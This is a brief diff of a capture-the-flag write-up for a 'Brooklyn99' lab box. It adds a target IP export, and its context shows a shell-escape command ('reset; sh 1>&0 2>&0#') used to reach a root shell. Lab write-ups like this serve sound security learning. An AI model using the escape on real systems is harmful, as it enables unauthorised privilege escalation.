@@ -1,4 +1,5 @@
 # Brooklyn99 CTF
+export ip=10.10.15.26
 ## Enumeration
 Going to the site and checking the html we can see this 
 ```html 
@@ -175,5 +176,6 @@ Command to execute: reset; sh 1>&0 2>&0#
 root
 # 
 ````
+
 We have found both ways to root the box. 
 --------
